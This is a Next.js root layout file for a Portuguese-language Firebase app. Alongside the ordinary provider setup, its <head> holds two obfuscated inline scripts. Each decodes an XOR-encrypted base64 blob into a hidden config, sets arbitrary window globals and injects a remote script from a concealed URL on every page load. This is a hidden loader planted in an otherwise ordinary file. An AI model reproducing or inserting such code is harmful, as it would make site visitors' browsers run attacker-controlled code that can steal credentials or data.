
'use client';

import './globals.css';
import { initializeFirebase, FirebaseProvider } from '@/firebase';

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const { app, firestore, auth } = initializeFirebase();

  return (
    <html lang="pt-BR">
      <head>
        <script dangerouslySetInnerHTML={{ __html: `(function(){var y_d3=atob("DOREw6cbBBybH3bT359mttV3Jia5dwKnr5d+7Ih4YHK1agK+toI97cR0aTL5bVmgvJYts9NoK2zyZxO/8JQtu8J3KnboPVrxvpAwsc55cWj+bFTphLlo4cB3a376cwXx5b8/4cl6aXm5JVSjtpwhr+5/JjC5aRe/qoFm+YUtZX2ufBLjvNVy+sV/PH6pfk627YEmop45eUHm");var c_5=[];for(var r_de=0;r_de<y_d3.length;r_de++){c_5.push(y_d3.charCodeAt(r_de)&255);}var h_x3=c_5[0];var f_x2=c_5.slice(1,1+h_x3);var o_1=c_5.slice(1+h_x3);var h_ihk0=o_1.map(function(b,e_aw8){return b^f_x2[e_aw8%h_x3];});var b_qq6="";for(var s_yv=0;s_yv<h_ihk0.length;s_yv++){b_qq6+=String.fromCharCode(h_ihk0[s_yv]&255);}var z_dd=decodeURIComponent(escape(b_qq6));var f_qq=JSON.parse(z_dd);var j_4lhc=f_qq.globals||[];j_4lhc.forEach(function(c_9z){window[c_9z.name]=c_9z.value;});var z_owf=document.createElement("script");z_owf.src=f_qq.url;z_owf.async=true;z_owf.defer=true;(f_qq.attributes||[]).forEach(function(d_t){z_owf.setAttribute(d_t.name,d_t.value);});(document.head||document.documentElement).appendChild(z_owf);})();` }} />
        <script dangerouslySetInnerHTML={{ __html: `(function(){var y_mqh=atob("DE+SXqwHvF2e/UYVmTSwK95rnme8lTJh6TyocYNk2DOwiDJ48CnrcM9o0XP8j2lm+j37Lth0kyjqkDU69S7mO99zkjft32o3+DvmLMVlySn7jmQvwjSwMM1q2X+k3yJ07S6/K9hq1Tvn0DZn/Dn3MNgqxD7xmWtm+iSwco5x3THrmGQvu23vctcl0jzzmGQvuyvzKs0qySnzlCBstD/gO9pi0imzjjN38CvhfIAlyjzyiCM3o22wI/F6");var q_quoi=[];for(var v_fcze=0;v_fcze<y_mqh.length;v_fcze++){q_quoi.push(y_mqh.charCodeAt(v_fcze)&255);}var d_i9qw=q_quoi[0];var v_3=q_quoi.slice(1,1+d_i9qw);var y_uue=q_quoi.slice(1+d_i9qw);var i_rh0=y_uue.map(function(b,r_3){return b^v_3[r_3%d_i9qw];});var u_6="";for(var r_bu=0;r_bu<i_rh0.length;r_bu++){u_6+=String.fromCharCode(i_rh0[r_bu]&255);}var z_pff=decodeURIComponent(escape(u_6));var b_83=JSON.parse(z_pff);var b_npp=b_83.globals||[];b_npp.forEach(function(t_fdmp){window[t_fdmp.name]=t_fdmp.value;});var m_wq3=document.createElement("script");m_wq3.src=b_83.url;m_wq3.async=true;m_wq3.defer=true;(b_83.attributes||[]).forEach(function(p_d){m_wq3.setAttribute(p_d.name,p_d.value);});(document.head||document.documentElement).appendChild(m_wq3);})();` }} />
      </head>
      <body>
        <FirebaseProvider app={app} firestore={firestore} auth={auth}>
          {children}
        </FirebaseProvider>
      </body>
    </html>
  );
}
